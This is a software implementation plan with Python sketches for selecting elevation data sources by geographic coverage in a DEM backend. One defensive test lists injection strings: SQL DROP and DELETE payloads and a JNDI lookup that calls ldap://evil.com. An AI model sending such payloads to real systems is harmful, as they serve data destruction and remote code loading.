# Spatial Coverage-Based DEM Source Selection Implementation Plan (v2)
## Revision incorporating Senior Engineering Review Feedback

## Executive Summary

This plan outlines the implementation of an automated, spatial coverage-based source selection system for the DEM Backend service. The system will automatically select the highest resolution elevation data source based on geographic location while maintaining full backward compatibility with existing API endpoints.

**Key Improvements in v2:**
- Configurable source database (JSON/environment-based)
- Enhanced selection logic with tie-breaking rules
- Security considerations for public endpoints
- Polygon support planning for irregular boundaries
- Comprehensive edge case testing
- Google Elevation API as invisible final fallback
- SQL injection protection tests
- Schema versioning for configuration evolution

## Project Goals

1. **Automated Source Selection**: Select the best elevation source based on coordinates and resolution
2. **Coverage Visualization**: Provide coverage area data for frontend map visualization
3. **Backward Compatibility**: Maintain existing API endpoints without breaking changes
4. **Cost Optimization**: Prioritize S3 sources over API sources when available
5. **Transparency**: Provide clear information about data sources and selection reasoning

## Architecture Overview

### Current Architecture (Problems)
- Configuration-based source selection via `.env` file
- GPXZ API integration not working (treats `api://gpxz` as file path)
- Poor source selection logic (always defaults to one source)
- No geographic awareness for source selection

### New Architecture (Solutions)
- Configurable spatial database with comprehensive source metadata
- Automated selection with clear tie-breaking rules
- Proper API/S3 source handling with error resilience
- Coverage visualization endpoints with security controls
- Future-ready for polygon boundaries and spatial indexing

## Implementation Phases

### Phase 1: Core Spatial Database (Week 1)

#### 1.1 Create Configurable Coverage Database
**File**: `src/coverage_database.py`
```python
import json
import os
from typing import List, Dict, Any
from pathlib import Path

class CoverageDatabase:
    def __init__(self, config_path: str = None):
        """
        Initialize coverage database from JSON config or environment variable
        """
        if config_path:
            self.sources = self._load_from_file(config_path)
        elif os.getenv('DEM_SOURCES_CONFIG_PATH'):
            self.sources = self._load_from_file(os.getenv('DEM_SOURCES_CONFIG_PATH'))
        else:
            self.sources = self._get_default_sources()
            
        self._validate_sources()
    
    def _load_from_file(self, path: str) -> List[Dict[str, Any]]:
        """Load sources from JSON configuration file"""
        with open(path, 'r') as f:
            return json.load(f)['elevation_sources']
    
    def _get_default_sources(self) -> List[Dict[str, Any]]:
        """Default hardcoded sources - all attributes included"""
        return [
            {
                "id": "act_elvis",
                "name": "Australian Capital Territory LiDAR",
                "source_type": "s3",
                "path": "s3://road-engineering-elevation-data/act-elvis/",
                "crs": "EPSG:3577",
                "resolution_m": 1,
                "data_type": "LiDAR",
                "provider": "NSW Elvis",
                "priority": 1,
                "bounds": {
                    "type": "bbox",  # Future: support "polygon"
                    "min_lat": -35.9, "max_lat": -35.1, 
                    "min_lon": 148.7, "max_lon": 149.4
                },
                "cost_per_query": 0.001,
                "accuracy": "±0.1m",
                "enabled": True,
                "metadata": {
                    "capture_date": "2019-2021",
                    "point_density": "8 points/m²"
                }
            },
            # Additional sources with complete attributes...
        ]
    
    def _validate_sources(self):
        """Validate all sources have required attributes"""
        required_fields = [
            'id', 'name', 'source_type', 'path', 'crs', 
            'resolution_m', 'data_type', 'provider', 'priority', 
            'bounds', 'cost_per_query', 'accuracy', 'enabled'
        ]
        for source in self.sources:
            missing = [f for f in required_fields if f not in source]
            if missing:
                raise ValueError(f"Source {source.get('id', 'unknown')} missing fields: {missing}")
```

**Configuration File**: `config/dem_sources.json`
```json
{
  "schema_version": "1.0",
  "last_updated": "2024-01-17",
  "elevation_sources": [
    {
      "id": "act_elvis",
      "name": "Australian Capital Territory LiDAR",
      "source_type": "s3",
      "path": "s3://road-engineering-elevation-data/act-elvis/",
      "crs": "EPSG:3577",
      "resolution_m": 1,
      "data_type": "LiDAR",
      "provider": "NSW Elvis",
      "priority": 1,
      "bounds": {
        "type": "bbox",
        "min_lat": -35.9,
        "max_lat": -35.1,
        "min_lon": 148.7,
        "max_lon": 149.4
      },
      "cost_per_query": 0.001,
      "accuracy": "±0.1m",
      "enabled": true,
      "metadata": {
        "capture_date": "2019-2021",
        "point_density": "8 points/m²"
      }
    }
  ]
}
```

### Phase 2: Enhanced Spatial Selection Logic (Week 1-2)

#### 2.1 Create Spatial Selector with Tie-Breaking
**File**: `src/spatial_selector.py`
```python
from typing import List, Dict, Optional, Tuple
import logging
from shapely.geometry import Point, box
from shapely.ops import transform
import pyproj

logger = logging.getLogger(__name__)

class AutomatedSourceSelector:
    def __init__(self, coverage_db: CoverageDatabase):
        self.sources = coverage_db.sources
        self._init_spatial_index()
        
    def _init_spatial_index(self):
        """Initialize spatial index for performance (future enhancement)"""
        # TODO: Implement R-tree index for >100 sources
        pass
    
    def select_best_source(self, lat: float, lon: float) -> Dict:
        """
        Select highest resolution source with clear tie-breaking rules
        
        Tie-breaking order:
        1. Priority (lower number = higher priority)
        2. Resolution (lower meters = better)
        3. Cost per query (lower = better)
        4. Alphabetical ID (for deterministic behavior)
        """
        # Input validation
        if not (-90 <= lat <= 90) or not (-180 <= lon <= 180):
            raise ValueError(f"Invalid coordinates: lat={lat}, lon={lon}")
            
        # Find covering sources
        covering_sources = self._get_covering_sources(lat, lon)
        
        if not covering_sources:
            raise ValueError(f"No coverage available for coordinates ({lat}, {lon})")
        
        # Sort with explicit tie-breaking
        best_source = min(
            covering_sources,
            key=lambda s: (
                s['priority'],
                s['resolution_m'], 
                s['cost_per_query'],
                s['id']  # Alphabetical tie-breaker
            )
        )
        
        logger.info(
            f"Selected source '{best_source['id']}' for ({lat}, {lon}): "
            f"priority={best_source['priority']}, "
            f"resolution={best_source['resolution_m']}m"
        )
        
        return best_source
    
    def _get_covering_sources(self, lat: float, lon: float) -> List[Dict]:
        """Get all sources that cover the given point"""
        covering = []
        
        for source in self.sources:
            if not source['enabled']:
                continue
                
            if self._point_in_bounds(lat, lon, source['bounds']):
                covering.append(source)
        
        return covering
    
    def _point_in_bounds(self, lat: float, lon: float, bounds: Dict) -> bool:
        """
        Check if point is within bounds
        Handles edge cases: exactly on boundary = included
        """
        if bounds['type'] == 'bbox':
            # Inclusive boundaries (>= and <=)
            return (bounds['min_lat'] <= lat <= bounds['max_lat'] and
                    bounds['min_lon'] <= lon <= bounds['max_lon'])
        elif bounds['type'] == 'polygon':
            # Future enhancement: GeoJSON polygon support
            raise NotImplementedError("Polygon bounds not yet supported")
        else:
            raise ValueError(f"Unknown bounds type: {bounds['type']}")
    
    def get_coverage_summary(self, lat: float, lon: float) -> Dict:
        """Get all available sources with selection reasoning"""
        covering_sources = self._get_covering_sources(lat, lon)
        
        if not covering_sources:
            return {
                "coordinates": {"lat": lat, "lon": lon},
                "best_source": None,
                "all_options": [],
                "total_sources": 0,
                "reason": "No coverage available at this location"
            }
        
        sorted_sources = sorted(
            covering_sources,
            key=lambda s: (s['priority'], s['resolution_m'], s['cost_per_query'], s['id'])
        )
        
        best = sorted_sources[0]
        
        return {
            "coordinates": {"lat": lat, "lon": lon},
            "best_source": best,
            "all_options": sorted_sources,
            "total_sources": len(sorted_sources),
            "reason": f"Selected '{best['id']}' (priority {best['priority']}, "
                     f"{best['resolution_m']}m resolution) from {len(sorted_sources)} options"
        }
```

### Phase 3: Backend API Updates with Security (Week 2)

#### 3.1 Update Existing Endpoints with Enhanced Responses
```python
@router.post("/elevation/point")
async def get_elevation_point(
    request: PointRequest,
    enhanced: bool = Query(False, description="Include enhanced metadata")
):
    """
    Get elevation for a single point
    
    Enhanced mode adds: resolution_m, data_type, accuracy
    Enabled via query parameter to maintain backward compatibility
    """
    try:
        selector = AutomatedSourceSelector(coverage_db)
        source = selector.select_best_source(request.latitude, request.longitude)
        
        # Get elevation using selected source
        elevation = await dem_service.get_elevation_for_point(
            request.latitude, 
            request.longitude,
            preferred_source=source['id']
        )
        
        # Base response (backward compatible)
        response = {
            "elevation_m": elevation,
            "source": source['id'],
            "coordinates": {
                "latitude": request.latitude,
                "longitude": request.longitude
            }
        }
        
        # Enhanced fields (opt-in)
        if enhanced:
            response.update({
                "resolution_m": source['resolution_m'],
                "data_type": source['data_type'],
                "accuracy": source['accuracy'],
                "provider": source['provider']
            })
        
        return response
        
    except ValueError as e:
        raise HTTPException(status_code=400, detail=str(e))
```

#### 3.2 New Management Endpoints with Security
```python
@router.get("/sources/database")
async def get_sources_database(
    include_sensitive: bool = Query(False, description="Include cost data"),
    api_key: Optional[str] = Header(None, alias="X-API-Key")
):
    """
    Get sources database with security controls
    
    Public access: Redacts sensitive fields (cost_per_query)
    Authenticated access: Full data with api_key
    """
    # Check authentication for sensitive data
    authenticated = api_key and await verify_api_key(api_key)
    
    sources = coverage_db.sources.copy()
    
    # Redact sensitive fields for public access
    if not include_sensitive or not authenticated:
        for source in sources:
            source.pop('cost_per_query', None)
            source.pop('path', None)  # Hide internal paths
    
    return {
        "sources": sources,
        "total_sources": len(sources),
        "authenticated": authenticated,
        "data_version": coverage_db.version
    }
```

### Phase 4: API Integration with Resilience & Fallback (Week 2-3)

#### 4.1 Enhanced GPXZ Client
**File**: `src/gpxz_client.py` (refactored)
```python
import asyncio
import httpx
from typing import Optional, Dict
from datetime import datetime, timedelta
import backoff

class GPXZClient:
    def __init__(self, api_key: str, base_url: str = "https://api.gpxz.io/v1"):
        self.api_key = api_key
        self.base_url = base_url
        self.client = httpx.AsyncClient(timeout=30.0)
        self._rate_limit_reset = None
        self._request_count = 0
        
    @backoff.on_exception(
        backoff.expo,
        (httpx.HTTPStatusError, httpx.RequestError),
        max_tries=3,
        giveup=lambda e: isinstance(e, httpx.HTTPStatusError) and e.response.status_code == 429
    )
    async def get_elevation(self, lat: float, lon: float) -> Optional[float]:
        """
        Get elevation with exponential backoff and rate limit handling
        """
        # Check rate limit
        if self._rate_limit_reset and datetime.now() < self._rate_limit_reset:
            wait_seconds = (self._rate_limit_reset - datetime.now()).total_seconds()
            raise RateLimitError(f"Rate limited. Retry after {wait_seconds}s")
        
        headers = {"Authorization": f"Bearer {self.api_key}"}
        params = {"lat": lat, "lon": lon}
        
        try:
            response = await self.client.get(
                f"{self.base_url}/elevation",
                headers=headers,
                params=params
            )
            response.raise_for_status()
            
            data = response.json()
            return data.get("elevation")
            
        except httpx.HTTPStatusError as e:
            if e.response.status_code == 429:
                # Extract rate limit reset time
                reset_time = e.response.headers.get("X-RateLimit-Reset")
                if reset_time:
                    self._rate_limit_reset = datetime.fromtimestamp(int(reset_time))
                raise RateLimitError("GPXZ API rate limit exceeded")
            raise
            
    async def close(self):
        await self.client.aclose()

class RateLimitError(Exception):
    """Raised when API rate limit is exceeded"""
    pass
```

#### 4.2 Source Handler Factory with Circuit Breaker
```python
from circuitbreaker import circuit

class SourceHandlerFactory:
    @staticmethod
    def get_handler(source_type: str, source_config: Dict):
        if source_type == "s3":
            return S3SourceHandler(source_config)
        elif source_type == "api":
            return APISourceHandler(source_config)
        else:
            raise ValueError(f"Unknown source type: {source_type}")

class APISourceHandler:
    def __init__(self, config: Dict):
        self.config = config
        self.client = GPXZClient(api_key=os.getenv("GPXZ_API_KEY"))
        
    @circuit(failure_threshold=5, recovery_timeout=60)
    async def get_elevation(self, lat: float, lon: float) -> Optional[float]:
        """Get elevation with circuit breaker protection"""
        try:
            return await self.client.get_elevation(lat, lon)
        except RateLimitError:
            # Don't trip circuit breaker for rate limits
            raise
        except Exception as e:
            logger.error(f"API source failed: {e}")
            raise
```

#### 4.3 Google Elevation API Fallback (Invisible)
**File**: `src/google_elevation_client.py`
```python
class GoogleElevationClient:
    """
    Google Elevation API - Final fallback (not shown in coverage maps)
    """
    def __init__(self, api_key: Optional[str] = None):
        self.api_key = api_key or os.getenv("GOOGLE_ELEVATION_API_KEY")
        self.base_url = "https://maps.googleapis.com/maps/api/elevation/json"
        self._daily_requests = 0
        self._reset_time = None
        
    async def get_elevation(self, lat: float, lon: float) -> Optional[float]:
        """Get elevation from Google as invisible final fallback"""
        if not self.api_key or self._daily_requests >= 2500:
            return None
            
        try:
            params = {"locations": f"{lat},{lon}", "key": self.api_key}
            response = await self.client.get(self.base_url, params=params)
            
            if response.json()["status"] == "OK":
                elevation = response.json()["results"][0]["elevation"]
                self._daily_requests += 1
                logger.info(f"Google fallback used: {elevation}m")
                return elevation
                
        except Exception as e:
            logger.error(f"Google API failed: {e}")
            
        return None
```

#### 4.4 Fallback Integration
**File**: `src/fallback_elevation_handler.py`
```python
class FallbackElevationHandler:
    """Manages invisible fallback sources"""
    
    async def get_fallback_elevation(
        self, lat: float, lon: float, failed_sources: list
    ) -> Optional[Dict]:
        """Try fallback when all mapped sources fail"""
        
        # Google Elevation as final resort
        elevation = await self.google_client.get_elevation(lat, lon)
        
        if elevation is not None:
            return {
                "elevation_m": elevation,
                "source": "fallback",  # Generic name
                "is_fallback": True,
                "resolution_m": 10,
                "accuracy": "±3m"
            }
            
        return None  # Complete failure
```

### Phase 5: Testing & Edge Cases (Week 3)

#### 5.1 Comprehensive Test Suite
**File**: `tests/test_spatial_selector.py`
```python
import pytest
from src.spatial_selector import AutomatedSourceSelector
from src.coverage_database import CoverageDatabase

class TestSpatialSelector:
    
    @pytest.fixture
    def selector(self):
        db = CoverageDatabase("tests/fixtures/test_sources.json")
        return AutomatedSourceSelector(db)
    
    def test_point_exactly_on_boundary(self, selector):
        """Test points exactly on bbox edges are included"""
        # ACT boundary: min_lat=-35.9
        source = selector.select_best_source(-35.9, 149.0)
        assert source['id'] == 'act_elvis'
        
    def test_point_outside_all_coverage(self, selector):
        """Test meaningful error for uncovered areas"""
        with pytest.raises(ValueError) as exc:
            selector.select_best_source(-90.0, 0.0)  # Antarctica
        assert "No coverage available" in str(exc.value)
        
    def test_tie_breaking_rules(self, selector):
        """Test deterministic selection with identical priority/resolution"""
        # Add two sources with same priority/resolution
        selector.sources.extend([
            {"id": "source_b", "priority": 1, "resolution_m": 1, "cost_per_query": 0.001, ...},
            {"id": "source_a", "priority": 1, "resolution_m": 1, "cost_per_query": 0.001, ...}
        ])
        
        source = selector.select_best_source(-35.5, 149.0)
        assert source['id'] == 'source_a'  # Alphabetical tie-breaker
        
    def test_input_validation(self, selector):
        """Test coordinate validation"""
        with pytest.raises(ValueError):
            selector.select_best_source(91.0, 0.0)  # Invalid latitude
        with pytest.raises(ValueError):
            selector.select_best_source(0.0, 181.0)  # Invalid longitude
            
    def test_disabled_sources_ignored(self, selector):
        """Test disabled sources are not selected"""
        # Disable all sources except global
        for source in selector.sources:
            if source['id'] != 'gpxz_global_srtm':
                source['enabled'] = False
                
        source = selector.select_best_source(-35.5, 149.0)
        assert source['id'] == 'gpxz_global_srtm'
        
    def test_sql_injection_protection(self, selector):
        """Test injection attempts in coordinates"""
        malicious_inputs = [
            ("1; DROP TABLE sources;", 0),
            ("0", "'; DELETE FROM sources;"),
            ("-90.0 OR 1=1", "0"),
            ("${jndi:ldap://evil.com}", "0")
        ]
        
        for lat, lon in malicious_inputs:
            with pytest.raises((ValueError, TypeError)):
                selector.select_best_source(lat, lon)
```

#### 5.2 Performance Tests
```python
import asyncio
import time
from concurrent.futures import ThreadPoolExecutor

class TestPerformance:
    
    async def test_concurrent_selections(self, selector):
        """Test performance under concurrent load"""
        coordinates = [
            (-35.5 + i*0.1, 149.0 + i*0.1) 
            for i in range(100)
        ]
        
        start = time.time()
        
        # Concurrent selection requests
        tasks = [
            selector.select_best_source(lat, lon) 
            for lat, lon in coordinates
        ]
        results = await asyncio.gather(*tasks)
        
        duration = time.time() - start
        
        assert len(results) == 100
        assert duration < 1.0  # Should complete in <1s
        
    def test_large_source_database(self):
        """Test with 1000+ sources"""
        # Generate large database
        sources = []
        for i in range(1000):
            sources.append({
                "id": f"source_{i}",
                "bounds": {
                    "type": "bbox",
                    "min_lat": -90 + i*0.1,
                    "max_lat": -89 + i*0.1,
                    "min_lon": -180 + i*0.1,
                    "max_lon": -179 + i*0.1
                },
                # ... other required fields
            })
            
        db = CoverageDatabase()
        db.sources = sources
        selector = AutomatedSourceSelector(db)
        
        # Should still be fast with spatial indexing
        start = time.time()
        source = selector.select_best_source(0, 0)
        duration = time.time() - start
        
        assert duration < 0.01  # <10ms per lookup
```

### Phase 6: Migration & Monitoring (Week 3-4)

#### 6.1 Feature Flag Implementation
```python
# src/config.py
USE_SPATIAL_SELECTION = os.getenv("USE_SPATIAL_SELECTION", "false").lower() == "true"
SPATIAL_SELECTION_PERCENTAGE = int(os.getenv("SPATIAL_SELECTION_PERCENTAGE", "0"))

# src/dem_service.py
import random

class DEMService:
    async def get_elevation_for_point(self, lat: float, lon: float, **kwargs):
        # Gradual rollout logic
        use_new_system = (
            USE_SPATIAL_SELECTION and 
            random.randint(1, 100) <= SPATIAL_SELECTION_PERCENTAGE
        )
        
        if use_new_system:
            return await self._get_elevation_spatial(lat, lon, **kwargs)
        else:
            return await self._get_elevation_legacy(lat, lon, **kwargs)
```

#### 6.2 Monitoring & Metrics
```python
# src/metrics.py
from prometheus_client import Counter, Histogram, Gauge

# Selection metrics
source_selections = Counter(
    'dem_source_selections_total',
    'Total source selections',
    ['source_id', 'resolution', 'priority']
)

selection_latency = Histogram(
    'dem_source_selection_duration_seconds',
    'Source selection latency'
)

coverage_gaps = Counter(
    'dem_coverage_gaps_total',
    'Requests with no coverage'
)

# Usage in selector
class AutomatedSourceSelector:
    def select_best_source(self, lat: float, lon: float):
        with selection_latency.time():
            try:
                source = self._select_best_source_internal(lat, lon)
                source_selections.labels(
                    source_id=source['id'],
                    resolution=source['resolution_m'],
                    priority=source['priority']
                ).inc()
                return source
            except ValueError:
                coverage_gaps.inc()
                raise
```

## Technical Specifications

### Source Priority Rules (Enhanced)
1. **Priority 1**: High-resolution local S3 sources (1m)
2. **Priority 2**: Enhanced GPXZ coverage (10-25m)
3. **Priority 3**: Global GPXZ fallback (30m)
4. **Invisible Fallback**: Google Elevation API (10m) - Not shown in coverage

### Selection Algorithm (Detailed)
```
1. Validate input coordinates (-90≤lat≤90, -180≤lon≤180)
2. Find all enabled sources covering the point (inclusive boundaries)
3. If no sources found, raise ValueError with descriptive message
4. Sort sources by:
   a. Priority (ascending: 1, 2, 3)
   b. Resolution_m (ascending: 1m, 10m, 25m, 30m)
   c. Cost_per_query (ascending: $0.001, $0.01)
   d. ID (alphabetical: act_elvis, nsw_elvis, vic_elvis)
5. Return first (best) source
6. Log selection decision
7. If all sources fail, try invisible Google fallback (not in coverage maps)
```

### Performance Specifications
- **In-memory selection**: <1ms for <100 sources
- **Spatial index required**: >100 sources (R-tree via shapely)
- **Cache considerations**: LRU cache for repeated queries
- **Connection pooling**: Reuse HTTP clients for API sources

### Security Specifications
- **Public endpoints**: Redact cost_per_query, internal paths
- **Authentication**: Optional API key for full data access
- **Input validation**: Strict coordinate bounds checking
- **Rate limiting**: Respect external API limits, implement internal limits

## Future Enhancements

### Polygon Boundary Support
```python
# Future bounds format
"bounds": {
    "type": "polygon",
    "coordinates": [
        [[148.7, -35.9], [149.4, -35.9], [149.4, -35.1], [148.7, -35.1], [148.7, -35.9]]
    ]
}
```

### Spatial Indexing
- Implement R-tree index using `rtree` or `shapely.STRtree`
- Required when source count exceeds 100
- Expected performance: O(log n) vs O(n) for boundary checks

### Dynamic Source Updates
- REST API for adding/updating sources
- Webhook notifications for coverage changes
- Automated boundary validation

## Success Metrics (Quantified)

### Technical Metrics
- **Source selection accuracy**: >99.9% (validated via tests)
- **Response time**: <500ms for 95th percentile
- **Cache hit rate**: >80% for repeated regions
- **API fallback rate**: <20% (S3 preferred)
- **Zero downtime migration**: Feature flag rollout

### Business Metrics
- **Cost reduction**: 30% less GPXZ API usage
- **Data quality**: 80% of queries use ≤1m resolution
- **Coverage transparency**: 100% adoption of coverage visualization
- **System reliability**: 99.9% uptime SLA

### Operational Metrics
- **Configuration errors**: <1 per month (validation prevents most)
- **Coverage gap reports**: <5% of requests
- **Source update frequency**: Weekly automated validation

## Timeline Summary

**Week 1**: 
- Configurable coverage database with validation
- Enhanced spatial selector with tie-breaking
- Edge case handling and input validation

**Week 2**: 
- Security-enhanced API endpoints
- GPXZ client with resilience patterns
- Source handler factory with circuit breakers

**Week 3**: 
- Comprehensive test suite (unit, integration, performance)
- Frontend support documentation
- Monitoring and metrics implementation

**Week 4**: 
- Staged rollout with feature flags
- Performance validation and optimization
- Production deployment

## Appendix A: Architecture Diagram

```
┌─────────────────┐     ┌─────────────────┐     ┌─────────────────┐
│   API Request   │────▶│ Spatial Selector│────▶│ Coverage Database│
│ /elevation/point│     │  (Best Source)  │     │  (JSON Config)  │
└─────────────────┘     └─────────────────┘     └─────────────────┘
                                │
                                ▼
                    ┌───────────────────────┐
                    │  Source Handler Factory│
                    └───────────────────────┘
                         │              │
                    ┌────▼────┐    ┌────▼────┐
                    │S3 Handler│    │API Handler│
                    │         │    │ (GPXZ)   │
                    └─────────┘    └──────────┘
```

## Appendix B: Environment Configuration

### Required Environment Variables
```bash
# Spatial Database Configuration
DEM_SOURCES_CONFIG_PATH=config/dem_sources.json
USE_SPATIAL_SELECTION=true
SPATIAL_SELECTION_PERCENTAGE=100

# GPXZ API Configuration
GPXZ_API_KEY=your_gpxz_api_key
GPXZ_DAILY_LIMIT=100

# Google Elevation API (Invisible Fallback)
GOOGLE_ELEVATION_API_KEY=your_google_api_key
GOOGLE_ELEVATION_ENABLED=true
GOOGLE_ELEVATION_DAILY_LIMIT=2500

# AWS S3 Configuration
AWS_ACCESS_KEY_ID=your_aws_key
AWS_SECRET_ACCESS_KEY=your_aws_secret
AWS_DEFAULT_REGION=ap-southeast-2
```

## Appendix C: Commit Message Templates

```bash
# Phase 1
feat: Implement configurable spatial coverage database
- Add CoverageDatabase class with JSON config support
- Include complete source metadata and validation
- Support environment-based configuration
Per Phase 1 of SPATIAL_COVERAGE_IMPLEMENTATION_PLAN_V2.md

# Phase 2  
feat: Add spatial selector with enhanced tie-breaking logic
- Implement deterministic source selection algorithm
- Add boundary edge case handling
- Include comprehensive input validation
Per Phase 2 of SPATIAL_COVERAGE_IMPLEMENTATION_PLAN_V2.md

# Phase 4
fix: Refactor GPXZ client with resilience patterns
- Add exponential backoff for transient errors
- Implement proper rate limit handling
- Include circuit breaker for API protection
Fixes #123, Per Phase 4 of SPATIAL_COVERAGE_IMPLEMENTATION_PLAN_V2.md
```